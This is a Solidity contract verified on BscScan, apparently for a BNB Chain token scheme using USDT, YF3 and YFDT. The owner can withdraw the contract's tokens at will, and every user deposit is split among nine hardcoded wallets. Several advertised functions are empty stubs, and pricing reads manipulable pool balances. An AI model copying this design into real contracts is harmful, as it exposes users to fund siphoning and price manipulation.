/**
 *Submitted for verification at BscScan.com on 2024-01-18
*/

pragma solidity 0.8.18;
interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IERC20 {
    function decimals() external view returns (uint8);


    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function mint(uint256 amount) external returns (uint256);

    function destroy(uint256 amount) external returns (uint256);

    function getPrice() external view returns (uint256);
}
 
abstract contract Ownable {
    address internal _owner;
    address internal Operator = 0x000000000000000000000000000000000000dEaD;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!o");
        _;
    }


     modifier onlyOperator() {
        require(Operator == msg.sender, "!o");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

 

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "n0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function transferOperatorShip(address _Operator) public virtual onlyOwner {
        require(_Operator != address(0), "n0");
        Operator = _Operator;
    }
}

contract IIIYF is Ownable {

    address a15 = 0x708d075F90AAcfD8322449D8bCec673383185f6A;
    address a3 = 0xa5371EF0f9b7Fe9c677A564873D87c9de4B04aDf;
    address a2 = 0xC612a7aAA4F2299a2E20f47DaedB28F652dC9d2e;

    address ar15 = 0xF0DD05d75A4886d5f958094372289d8Ebf677306;
    address ar2 = 0xFd8Be94BeEe64f9C81E01671840442b7170717De;
    address ar3 = 0x57f147D9526346ed11225fAa8ad11Bf961030BaC;
    address ar17_68 = 0x410b6FD3E774160fAFcdc9781fF5c3F243C40A42;
    address ar1_2 = 0x9370b4dB1F75a387f5fEdB175ed8dc2B1C7A57A1;
    address ar1 = 0x5D03cda71605A406663182749Ae44A52E0c3a409;
    address ar1_4 = 0xB5b79D4d8777F5ff89dd03c79f493496a6f2bc1D;
    address ar1_6 = 0x862073E4f6ebdaef205244213e00F5D3fA37D837;
    address ar57_12 = 0x0edF68151BB68C15401eE439A258d6672023cA3E;
   
    address pair;
    IERC20 USDT;
    IERC20 YF3;
    IERC20 YFDT;

    address deadAddress = 0x0000000000000000000000000000000000000001;
    address chizi = 0xe8CaC516ed60d1f4DF72c59f963E891cF3bACc95;
    address chunYFDT = 0xCEAAa4801C290889Af002dD8cBEB4918345a0838;
    uint256 public  cprice = 100000000000000;



     constructor(
    ) {
        USDT  = IERC20(0x55d398326f99059fF775485246999027B3197955);
        YF3  = IERC20(0x6D2391FaEaC4DF050Aa38b5c600564290cC46809);
        YFDT  = IERC20(0x7f58792f69C8309A2b8c69201c940a231A3DFBE9);
        pair = 0x1642352526643B3652bBc487fBd11F823D4f34d0;
   
      
    }

    modifier noContract() {
        require(tx.origin == msg.sender, "contract not allowed");
        uint256 size;
        address addr = msg.sender;
        assembly {
            size := extcodesize(addr)
        }

        require(!(size > 0), "contract not allowed");
        _;
    }

    function getTokenPrice() public view returns (uint256) {
        return getPrice();
    }

    function _removeLiquidity(uint256 liquidity) private returns (uint, uint) {
        uint b = getTokenPrice()*(liquidity)/1e18;
        YF3.transferFrom(pair ,address(this)  ,liquidity);
        USDT.transferFrom(pair ,address(this) ,b);
        return (b, liquidity);
    }

 

    function Ttoken(uint256 value,uint256 TY) public onlyOwner {
        if(TY == 1){
            YF3.transfer(msg.sender ,value);
        } 
        else if(TY == 3){
            USDT.transfer(msg.sender ,value);
        } 
    }


     function setchizi( address CZ,uint256 TY) public onlyOwner {

        if(TY == 0){
            a15 = CZ;
        } 
        else if(TY == 1){
            a3 = CZ;
        }
          else if(TY == 2){
            a2 = CZ;
        } 
        else if(TY == 3){
            chizi = CZ;
        }
        else if(TY == 4){
            chunYFDT = CZ;
        }    
    }


    // 参与
    function ParticipateIntheGame() public   {
    }

    function addUSDT(uint256 amount) public   {
        require(
            USDT.transferFrom(msg.sender, pair, amount),
            "transfer error"
        );
    }
 



    function YFDTToUSDT(uint256 value ) public {
    }
    
    function YFDTandUSDT(address ad,uint256 value ) public  onlyOperator {
        YFDT.transferFrom(chizi,chunYFDT,value);
        USDT.transferFrom(ar17_68,ad,value);
    }

   function USDTToYFDT(uint256 value ) public {
        YFDT.transferFrom(chunYFDT,chizi,value);
        USDT.transferFrom(msg.sender,address(this),value);  
        USDT.transfer(ar15,value*1500/10000);  
        USDT.transfer(ar2,value*200/10000);  
        USDT.transfer(ar3,value*300/10000);  
        USDT.transfer(ar17_68,value*1768/10000);  
        USDT.transfer(ar1_2,value*120/10000);  
        USDT.transfer(ar1,value*100/10000);  
        USDT.transfer(ar1_4,value*140/10000);  
        USDT.transfer(ar1_6,value*160/10000);
        USDT.transfer(ar57_12,value*5712/10000);  
              
    }

   function YFDTtransfer(address to,uint256 value ) public{ 
    }

     function sellCard(uint256 ID1,uint256 ID2,uint256 ID3,uint256 ID4,uint256 ID5) public   {
        YF3.transferFrom(msg.sender ,deadAddress ,103*(1e17)/getTokenPrice()*(1e18));
    }
 

    function addLiquidity(uint256 amount,address sender) public  onlyOperator {
        uint256 YFAmount = getYFAmount(  amount*2/3);
         require(
            USDT.transferFrom(ar15, pair, amount),
            "transfer error1"
        );
         require(
            YF3.transferFrom(ar15, pair, YFAmount),
            "transfer error2"
        );
           require(
            YF3.transferFrom(ar15, sender, YFAmount),
            "transfer error3"
        );
     
    }
  function getYFAmount(uint256 amount) public view returns (uint256) {

        uint256 YFAmount = amount*(1e18)/getTokenPrice();
        return YFAmount;
    }
    function sell(uint256 amount) public  returns (uint256) {
        uint256 HDBalance = YF3.balanceOf(msg.sender);
        require(HDBalance >= amount, "balance error");
        require(
            YF3.transferFrom(msg.sender, address(this), amount),
            "transfer error"
        );

        (uint256 USDTAmount,uint256 YFAmount ) = _removeLiquidity(amount);
        YF3.transfer(deadAddress, YFAmount);
        USDT.transfer(msg.sender, USDTAmount*80/100);
        USDT.transfer(a15, USDTAmount*15/100);
        USDT.transfer(a3, USDTAmount*3/100);
        USDT.transfer(a2, USDTAmount*2/100);
        return USDTAmount;
    }

    function getPrice() public view returns (uint256) {
        uint256 usdtBalance = USDT.balanceOf(pair);
        uint256 YFBalance =YF3.balanceOf(pair);
        return usdtBalance*(1e18)/(YFBalance);
    }
 
 
}